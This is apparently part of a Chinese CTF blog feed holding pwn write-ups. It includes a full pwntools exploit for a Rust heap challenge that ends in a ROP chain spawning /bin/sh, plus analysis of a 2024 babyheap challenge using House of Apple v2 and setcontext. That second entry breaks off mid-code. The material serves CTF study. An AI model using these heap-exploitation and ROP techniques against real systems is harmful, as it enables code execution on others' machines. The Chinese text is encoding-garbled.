class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">6666</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *$rebase(0x1A979)</span></span><br><span class="line"><span class="string">b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:145</span></span><br><span class="line"><span class="string">set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"> </span><br><span class="line">p = start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content &gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tidy</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    y = p.recvline()[<span class="number">1</span>:-<span class="number">2</span>].decode().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    values = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp += <span class="built_in">int</span>(y[i * <span class="number">8</span> + <span class="number">7</span> - j])</span><br><span class="line">            tmp &lt;&lt;= <span class="number">8</span></span><br><span class="line">        tmp &gt;&gt;= <span class="number">8</span></span><br><span class="line">        values.append(tmp)</span><br><span class="line">    info([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values])</span><br><span class="line">    <span class="keyword">return</span> values</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr_list = tidy()</span><br><span class="line">stack_addr = addr_list[<span class="number">4</span>]</span><br><span class="line">elf.address = addr_list[<span class="number">5</span>] - <span class="number">0x635B0</span></span><br><span class="line">heap_addr = addr_list[<span class="number">1</span>]</span><br><span class="line">success(<span class="string">f&quot;stack_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;elf_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(elf.address)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;heap_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line">fake_heap = p64(<span class="number">1</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(heap_addr - <span class="number">0x2010</span>) + p64(<span class="number">0x1FE1</span>)</span><br><span class="line">edit(<span class="number">0</span>, fake_heap)</span><br><span class="line">tidy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add()</span><br><span class="line">info(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_qword</span>(<span class="params">addr, qword</span>):</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x51</span>) + p64(addr))</span><br><span class="line">    info(<span class="string">f&quot;Write <span class="subst">&#123;<span class="built_in">hex</span>(u64(qword))&#125;</span> to [<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>]&quot;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, qword)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">addr, content</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">8</span>):</span><br><span class="line">        arb_qword(addr + i, content[i : i + <span class="number">8</span>])</span><br><span class="line"> </span><br><span class="line">ret_addr = stack_addr + <span class="number">0x3D0</span></span><br><span class="line">syscall = elf.address + <span class="number">0x0000000000026FCF</span></span><br><span class="line">pop_rdi_rbp = elf.address + <span class="number">0x000000000001DD45</span></span><br><span class="line">pop_rsi_rbp = elf.address + <span class="number">0x000000000001E032</span></span><br><span class="line">pop_rax = elf.address + <span class="number">0x0000000000016F3E</span></span><br><span class="line">pop_rdx_xor_ptrax = elf.address + <span class="number">0x0000000000045DC5</span></span><br><span class="line">sub_rdx_rcx_add_rax_rcx = elf.address + <span class="number">0x000000000001FC60</span></span><br><span class="line">pop_rcx = elf.address + <span class="number">0x0000000000017FFF</span></span><br><span class="line">ret = elf.address + <span class="number">0x0000000000016BD8</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rdi_rbp) + p64(ret_addr + <span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_rbp) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rcx) + p64(<span class="number">0x33</span>)</span><br><span class="line">payload += p64(sub_rdx_rcx_add_rax_rcx)</span><br><span class="line">payload += p64(pop_rax) + p64(constants.SYS_execve)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">arb_write(ret_addr, payload)</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;é¢˜ç›®åˆ†æ&lt;/h1&gt;
&lt;p&gt;åˆ°æ‰‹ä¹‹åæ˜¯ä¸€ä¸ªæ‰£äº†ç¬¦å·çš„rustç¨‹åºï¼Œéå¸¸çš„æ¶å¿ƒã€‚&lt;/p&gt;
&lt;h1&gt;æœ€åçœ‹çœ‹å‡ºé¢˜äººçš„åˆ†äº«&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-284240.htm&quot;&gt;https:</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="é€†å‘" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
    <category term="rust" scheme="https://zjw1nd.github.io/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§çš„åŠ å¯†ç®—æ³•é€†å‘è¯†åˆ«</title>
    <link href="https://zjw1nd.github.io/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/"/>
    <id>https://zjw1nd.github.io/2024/11/11/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/</id>
    <published>2024-11-11T02:49:48.000Z</published>
    <updated>2024-11-11T02:49:48.628Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>How2Heapå®æˆ˜â€”â€”å¼ºç½‘æ¯2024babyheap</title>
    <link href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/"/>
    <id>https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/</id>
    <published>2024-11-10T15:55:14.000Z</published>
    <updated>2024-11-15T09:44:47.966Z</updated>
    
    <content type="html"><![CDATA[<h1>é¢˜ç›®åˆ†æ</h1><p>è¿™ä¸ªé¢˜ç›®ç»™äº†ç›¸å½“å¤šçš„checkï¼š</p><ul class="lvl-0"><li class="lvl-2">æ²™ç®±banäº†openï¼Œopenatå’Œexecveï¼Œglibc 2.35, é‡Šæ”¾æœ‰UAF, chunkåªèƒ½åˆ†é…0x500-0x5FFå¤§å°ï¼Œå…¶ä½™å¤§å°éƒ½ä¼šå˜æˆ0x500ï¼Œæœ€å¤š5ä¸ªï¼Œåªæœ‰ä¸€æ¬¡editä¸€æ¬¡showã€‚</li><li class="lvl-2">ç¨‹åºå¼€å§‹ä¼šæŠŠIO_wfile_jumpså‘åçš„pageå…¨å†™0</li><li class="lvl-2">åŒæ—¶å…è®¸ä¸€ä¸ªç»è¿‡checkçš„åœ°å€å†™16å­—èŠ‚ï¼Œcheckä¸å…è®¸å†™stdinåˆ°stdinå‘å0x1b000ï¼Œä»¥åŠstdin-1C67F700å¾€å‰ï¼ˆélibcæ®µä¸è®©å†™ï¼‰</li><li class="lvl-2">å¦å¤–æä¾›äº†ä¸€ä¸ªæ¥å£ï¼Œå…è®¸æŸ¥è¯¢USERç¯å¢ƒå˜é‡æˆ–è€…å°†å…¶ä¿®æ”¹ä¸ºâ€œflag?&quot;ï¼Œåªèƒ½ç”¨ä¸€æ¬¡ã€‚</li><li class="lvl-2">Largebin attackä¼šç”¨å®Œ5ä¸ªå—ï¼ŒåŒæ—¶ä¹Ÿä¼šç”¨æ‰å”¯ä¸€ä¸€æ¬¡UAF editã€‚åç»­æ²¡æœ‰åŠæ³•å†æ¬¡æ§åˆ¶chunkå†…å®¹</li><li class="lvl-2">è€Œä¸”é¢˜ç›®æä¾›çš„ä»»æ„åœ°å€å†™æ— æ³•å†™glibcå‰é¢ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰åœ°å€ï¼ŒåŒæ—¶ä¹Ÿæ²¡æ³•ç›´æ¥å†™å·²ç»æ‰“å¼€çš„IOï¼ˆ0-2å’ŒIOlistalléƒ½ä¸è¡Œï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change_user_env</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( flag_only_once )</span><br><span class="line">  &#123;</span><br><span class="line">    my_print((__int64)<span class="string">&quot;What ! Are you kidding me ? \n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  flag_only_once = <span class="number">1</span>;</span><br><span class="line">  my_print((__int64)<span class="string">&quot;What do you want from the environment ? \n&quot;</span>);</span><br><span class="line">  my_print((__int64)<span class="string">&quot;Maybe you will be sad !\n&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setenv(<span class="string">&quot;USER&quot;</span>, <span class="string">&quot;flag?&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_user();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      putenv(<span class="string">&quot;USER=flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">check_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="built_in">stdin</span>[<span class="number">512</span>] &gt; buf )      <span class="comment">// ä¸å…è®¸å†™012å’Œiolistall</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  result = buf;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;<span class="built_in">stdin</span>[<span class="number">-0x21AAA0</span>u] &gt; buf )               <span class="comment">// ä¸å…è®¸å†™heapå’Œç¨‹åºæœ¬èº«</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;                                <span class="comment">// å…¶ä»–çš„libcéƒ½å¯ä»¥æ”¹...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬è¯¥æ€ä¹ˆæ”»å‡»ï¼Ÿä¸‹é¢ä»‹ç»å‡ ç§é€šè¿‡è¿™ä¸ªé¢˜å…¶ä»–é˜Ÿä¼è§£å‡ºæ¥çš„wpè·å¾—çš„æ€è·¯ï¼Œæ„Ÿè§‰ä¸‹é¢è¿™äº›å†ä¸é€šå°±æ²¡ä»€ä¹ˆå¤ªå¤šåˆ«çš„æ€è·¯äº†ã€‚</p><h1>æ€è·¯ï¼Ÿ</h1><h2 id="IO-wfile-jumps-mmapä¸House-of-apple">_IO_wfile_jumps_mmapä¸House of apple</h2><p>åœ¨house_of_apple v2ä¸­ï¼ŒåŠ«æŒæ§åˆ¶æµä¾é çš„æ˜¯<code>IO_wfile_overflow</code>å‡½æ•°ï¼Œåˆ©ç”¨äº†å¯¹è¿™éƒ¨åˆ†vtableæ²¡æœ‰æ£€æŸ¥çš„ç‰¹æ€§ã€‚ä½†å…¶å®è¿™ä¸ªå‡½æ•°å­˜åœ¨äºä¸‰ä¸ªè™šè¡¨ä¸­ï¼ŒåŒ…æ‹¬<code>IO_wfile_jumps</code>ï¼Œ<code>io_wfile_jumps_mmap</code>ä»¥åŠ<code>io_wfile_jumps_maybe_mmap</code>ã€‚è¿™é“é¢˜å…¶å®æ²¡æœ‰æ§åˆ¶<code>IO_wfile_jumps_maybe_mmap</code>ï¼Œå› æ­¤å…¶å®æˆ‘ä»¬è¿˜æ˜¯èƒ½ç”¨house of appleã€‚</p><p>åœ¨pwndbgä¸­ç¡®å®š<code>io_wfile_overflow</code>çš„åœ°å€ååˆ©ç”¨search pointerå¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t pointer 0x7ffff7de1390</span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="string">&#x27;\x90\x13\xde\xf7\xff\x7f\x00\x00&#x27;</span></span><br><span class="line">libc-2.35.so    0x7ffff7f71f58 0x7ffff7de1390 <span class="comment"># offset: 0x216f58</span></span><br><span class="line">libc-2.35.so    0x7ffff7f72018 0x7ffff7de1390 <span class="comment"># offset: 0x217018</span></span><br><span class="line"><span class="comment"># io_wfile_jumps: offset: 0x2170c0</span></span><br></pre></td></tr></table></figure><p>å°½ç®¡io_wile_jumpsè¢«å†™0äº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯æœ‰2ä¸ªè™šè¡¨å­˜äº†è¿™ä¸ªå‡½æ•°ã€‚åœ¨IDAä¸­çœ‹äº†ä¸‹ï¼Œè¿™ä¸¤ä¸ªè¡¨libcéƒ½æ²¡æœ‰ç»™ç¬¦å·ï¼Œä½†æ˜¯éƒ½åœ¨io_wfile_jumpsä¸Šé¢ä¸€ç‚¹ç‚¹æ‰€ä»¥åˆ©ç”¨åº”è¯¥ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•ã€‚æˆ‘ä»¬æŠŠæœ¬æ¥å†™<code>IO_wfile_jumps</code>çš„åœ°æ–¹å†™æˆ<code>IO_wfile_Jumps-0xc0</code>å°±è¡Œäº†ã€‚</p><p>5ä¸ªå—å¤Ÿå‘èµ·ä¸€æ¬¡largebin attackäº†ï¼Œæ‰€ä»¥ä¸‹é¢é™„ä¸Šç¬”è€…è‡ªå·±å¤ç°çš„æ€è·¯ï¼ŒåŒæ—¶é¡ºæ‰‹æ€»ç»“ä¸€ä¸‹é€šè§£æ¿å­å¸Œæœ›ä¸‹æ¬¡èƒ½å¿«ç‚¹ã€‚æœ‰ç©ºæŠ½å‡ºæ¥å•å‘ä¸€ç¯‡blog</p><h3 id="æ‹†è§£æ­¥éª¤-House-of-apple-v2è§£å†³æ²™ç®±å †">æ‹†è§£æ­¥éª¤-House of apple v2è§£å†³æ²™ç®±å †</h3><p>ä¸Šæ¬¡ciscnçš„é‚£é“é¢˜å¤ç°ç»†èŠ‚å¤ªå¤šäº†ï¼Œæ²¡æœ‰å¾ˆå¥½åœ°æ•´ä½“æŠŠæ¡ï¼Œæœ‰ç‚¹æœºæ¢°çš„å¯¹ç€expè§£é‡Šä»£ç ï¼Œè¿™æ¬¡å‹¤æ¥çœ‹è¿™ç¯‡åº”è¯¥ä¸ä¼šæœ‰å¤ªå¤§é—®é¢˜äº†ã€‚</p><ol><li class="lvl-3"><p>ç¡®å®šæ¼æ´ç‚¹ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æœ‰ä¸€æ¬¡largebin attackçš„æœºä¼šï¼Ÿæ˜¯ä¸æ˜¯èƒ½UAFæ§åˆ¶largebinçš„å†…å®¹ï¼Ÿå¦‚æœæ˜¯ï¼Œé‚£è¿™é¢˜åªéœ€è¦ç»•è¿‡é¢˜ç›®çš„é™åˆ¶å°±ç»“æŸäº†</p></li><li class="lvl-3"><p>æˆ‘ä»¬éƒ½çŸ¥é“House of appleçš„é“¾æ¡ï¼Œä¸‹é¢å…·ä½“è¯´ä¸€ä¸‹<br>House of Apple-v2æ˜¯ä¸€ç³»åˆ—åˆ©ç”¨é«˜ç‰ˆæœ¬libcä¸‹ä¸å¯¹IO_file_completeä¸­å¤„ç†å®½å­—ç¬¦æµçš„_wide_dataçš„vtableåšæ£€æŸ¥çš„ç‰¹æ€§å®ç°çš„æ”»å‡»æ‰‹æ®µã€‚å…·ä½“æ€æƒ³æ˜¯ä¼ªé€ io_fileï¼Œç„¶åæœ‰ä¸¤æ­¥çš„è·³è½¬ï¼š</p></li></ol><ul class="lvl-0"><li class="lvl-4"><p>ä¼ªé€ wide_dataæŒ‡å‘ä¸€ä¸ªå¯æ§åœ°å€ï¼Œwide_dataä¹Ÿæ˜¯ç±»ä¼¼äºä¸€ä¸ªIO_fileçš„ç»“æ„ä½“</p></li><li class="lvl-4"><p>æ§åˆ¶wide_dataçš„vtableå­—æ®µï¼Œè®©vtableæŒ‡å‘å¯æ§åœ°å€</p></li><li class="lvl-4"><p>vtable+0x68å†™ä¸ºæˆ‘ä»¬è¦è·³è½¬çš„åœ°æ–¹ï¼ˆexitçš„æ—¶å€™è°ƒç”¨çš„io_wfile_overflowï¼‰</p></li></ul><ol start="3"><li class="lvl-3"><p>æ²¡æœ‰æ²™ç®±è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨one_gadgetç­‰æ‰‹æ®µäº†ï¼Œæœ‰æ²™ç®±å°±æ¶‰åŠåˆ°æ ˆè¿ç§»+ROPæˆ–ret2scçš„æ€æƒ³</p></li></ol><p>æˆ‘ä»¬åˆ©ç”¨setcontext+61(glibc 2.29å‰æ˜¯setcontext+53å¹¶ä¸”èƒ½ç”¨rdiæ§åˆ¶)è¿™ä¸ªgadgetï¼Œåœ¨rdx+0xa0å†™å…¥fakestackçš„åœ°å€ï¼Œåœ¨rdx+0xa8å†™å…¥ç¬¬ä¸€æ¡ROPæŒ‡ä»¤èµ·ç‚¹ï¼ˆå†™ä¸ªretå°±è¡Œï¼‰æ³¨æ„è¦è§‚å¯Ÿè·³å…¥setcontextçš„æ—¶å€™rdxæˆ–è€…rdiå¯„å­˜å™¨çš„å†…å®¹ã€‚æ¯”å¦‚å¦‚æœä½äº2.34çš„ç‰ˆæœ¬å¯ä»¥æ‰“free_hookç„¶årdiä¼šæ˜¯æˆ‘ä»¬çš„fakeioåœ°å€ã€‚è¿™é“é¢˜æ˜¯ç›´æ¥é€šè¿‡exité€€å‡ºï¼Œè°ƒè¯•å‘ç°è·³å…¥setcontextçš„æ—¶å€™rdxå°±æ˜¯wide_dataçš„åœ°å€</p><p>åé¢å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ROPé“¾äº†ã€‚</p><h3 id="expï¼ˆæ¿å­å’Œæ€è·¯é‡è¦ï¼‰">expï¼ˆæ¿å­å’Œæ€è·¯é‡è¦ï¼‰</h3><p>å¯¹äºæ¶‰åŠæ¥å›åç§»ï¼Œoverlapå¤ç”¨ç©ºé—´ç­‰ç­‰æ“ä½œæ¥è¯´ï¼Œpwntoolsçš„<code>FileStructure()</code>å°±ä¸é‚£ä¹ˆå¥½ç”¨äº†ï¼Œå¯ä»¥å‚è€ƒè‡ªå·±å†™çš„ä¸‹é¢è¿™ä¸ªå¸¦æœ‰åç§»çš„æ¿å­æ¥æ„é€ ï¼Œå•ä¸€chunkåŒ…å«æ‰€æœ‰ä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = gdb.debug(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your commodity size \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: 